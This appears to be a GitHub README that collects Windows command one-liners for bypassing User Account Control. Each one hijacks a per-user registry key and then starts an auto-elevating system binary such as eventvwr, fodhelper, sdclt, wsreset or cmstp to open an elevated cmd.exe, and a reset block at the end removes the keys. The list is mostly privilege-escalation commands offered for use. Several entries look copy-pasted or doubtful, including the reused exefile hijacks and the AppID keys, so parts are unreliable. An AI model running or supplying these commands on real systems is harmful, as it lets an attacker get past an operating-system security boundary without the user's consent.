# uac-bypass-oneliners

Collection of one-liners to bypass User Account Control (UAC) in Windows. These techniques exploit certain behavior in Windows applications to elevate privileges.

<a href="https://www.buymeacoffee.com/blue0x1" target="_blank"><img src="https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png" alt="Buy Me A Coffee" style="height: 41px !important;width: 174px !important;box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;-webkit-box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;" ></a>


Techniques
<br>

            
                                                                                                                                                                                              
  eventvwr.exe                                                                                                                                                                              
   ```                                                                                                                                                                                           
  reg add "HKCU\Software\Classes\mscfile\shell\open\command" /v DelegateExecute /t REG_SZ /d "" /f && reg add "HKCU\Software\Classes\mscfile\shell\open\command" /ve /t REG_SZ /d "cmd.exe" /f && eventvwr.exe                                                                                                                                                                            
  ```                                                                                                                                                                                            
  perfmon.exe                                                                                                                                                                                 
  ```                                                                                                                                                                                          
  reg add "HKCU\Software\Classes\mscfile\shell\open\command" /v DelegateExecute /t REG_SZ /d "" /f && reg add "HKCU\Software\Classes\mscfile\shell\open\command" /ve /t REG_SZ /d "cmd.exe" /f && start perfmon.exe                                                                                                                                                                       
  ```
  fodhelper.exe                                                                                                                                                                               
  ```                                                                                                                                                                                          
  reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v DelegateExecute /t REG_SZ /d "" /f && reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /ve /t REG_SZ /d "cmd.exe" /f && start fodhelper.exe                                                                                                                                                         
  ```
  computerdefaults.exe                                                                                                                                                                        
  ```                                                                                                                                                                                          
  reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /t REG_SZ /d "" /f && reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /ve /t REG_SZ /d "cmd.exe" /f && start computerdefaults.exe                                                                                                                                                  
  ```
  sdclt.exe                                                                                                                                                                                   
  ```                                                                                                                                                                                          
  reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" /ve /t REG_SZ /d "cmd.exe" /f && start sdclt.exe
  ```                                                                                                                                                                                            
  slui.exe
  ```                                                                                                                                                                                            
  reg add "HKCU\Software\Classes\exefile\shell\open\command" /v DelegateExecute /t REG_SZ /d "" /f && reg add "HKCU\Software\Classes\exefile\shell\open\command" /ve /t REG_SZ /d "cmd.exe" /f && start slui.exe                                                                                                                                                                          
  ```
  taskmgr.exe                                                                                                                                                                                 
  ```                                                                                                                                                                                          
  reg add "HKCU\Software\Classes\taskmgr\shell\open\command" /ve /t REG_SZ /d "cmd.exe" /f && start taskmgr.exe
  ```                                                                                                                                                                                            
  sysprep.exe
  ```                                                                                                                                                                                            
  reg add "HKCU\Software\Classes\AppID\{921C1A8B-9F15-4DA4-9235-0472C3A216E6}" /ve /t REG_SZ /d "cmd.exe" /f && start C:\Windows\System32\sysprep\sysprep.exe                               
  ```                                                                                                                                                                                            
  control.exe /computername
  ```                                                                                                                                                                                            
  reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" /ve /t REG_SZ /d "cmd.exe" /f && control.exe /computername                                                 
 ```                                                                                                                                                                                    
  wsreset.exe (Windows Store Reset)
  ```                                                                                                                                                                                          
  reg add "HKCU\Software\Classes\AppX82a6gwre4fdg3ve545ctp9c9nt4m79fl\Shell\open\command" /v DelegateExecute /t REG_SZ /d "" /f && reg add "HKCU\Software\Classes\AppX82a6gwre4fdg3ve545ctp9c9nt4m79fl\Shell\open\command" /ve /t REG_SZ /d "cmd.exe" /f && start wsreset.exe                                                          
   ```
  dccw.exe (Display Color Calibration)                                                                                                                                                        
   ```                                                                                                                                                                                         
  reg add "HKCU\Software\Classes\exefile\shell\open\command" /v DelegateExecute /t REG_SZ /d "" /f && reg add "HKCU\Software\Classes\exefile\shell\open\command" /ve /t REG_SZ /d "cmd.exe" /f && start dccw.exe                                                                                                                                                                          
   ```
  cmstp.exe (INF file via pipe)                                                                                                                                                               
  ```                                                                                                                                                                                          
  echo [version] > %tmp%\bypass.inf && echo Signature=$chicago$ >> %tmp%\bypass.inf && echo [DefaultInstall] >> %tmp%\bypass.inf && echo RunPreSetupCommands=cmd1 >> %tmp%\bypass.inf && echo [cmd1] >> %tmp%\bypass.inf && echo cmd.exe >> %tmp%\bypass.inf && cmstp.exe /au %tmp%\bypass.inf                                                                                            
   ```
  msconfig.exe                                                                                                                                                                                
  ```                                                                                                                                                                                          
  reg add "HKCU\Software\Classes\exefile\shell\open\command" /v DelegateExecute /t REG_SZ /d "" /f && reg add "HKCU\Software\Classes\exefile\shell\open\command" /ve /t REG_SZ /d "cmd.exe" /f && start msconfig.exe                                                                                                                                                                      
   ```
  cleanmgr.exe (Disk Cleanup)                                                                                                                                                                 
  ```                                                                                                                                                                                         
  reg add "HKCU\Software\Classes\AppID\{34A34E0C-0547-4FBE-9B41-D5F27CF5F994}" /ve /t REG_SZ /d "cmd.exe" /f && start cleanmgr.exe
  ```                                                                                                                                                                                            
  wusa.exe
  ```                                                                                                                                                                                        
  reg add "HKCU\Software\Classes\exefile\shell\open\command" /v DelegateExecute /t REG_SZ /d "" /f && reg add "HKCU\Software\Classes\exefile\shell\open\command" /ve /t REG_SZ /d "cmd.exe" /f && wusa.exe                                                                                                                                                                                
   ```
  ---                                                                                                                                                                                         
  Reset (All)                                               
```
  reg delete "HKCU\Software\Classes\mscfile\shell\open\command" /f
  reg delete "HKCU\Software\Classes\ms-settings\shell\open\command" /f                                                                                                                        
  reg delete "HKCU\Software\Classes\ms-settings\Shell\Open\command" /f
  reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" /f                                                                                                        
  reg delete "HKCU\Software\Classes\exefile\shell\open\command" /f                                                                                                                            
  reg delete "HKCU\Software\Classes\taskmgr\shell\open\command" /f
  reg delete "HKCU\Software\Classes\AppID\{921C1A8B-9F15-4DA4-9235-0472C3A216E6}" /f                                                                                                          
  reg delete "HKCU\Software\Classes\AppX82a6gwre4fdg3ve545ctp9c9nt4m79fl\Shell\open\command" /f
  reg delete "HKCU\Software\Classes\AppID\{34A34E0C-0547-4FBE-9B41-D5F27CF5F994}" /f                                                                                                          
```                                                                                                                                                     

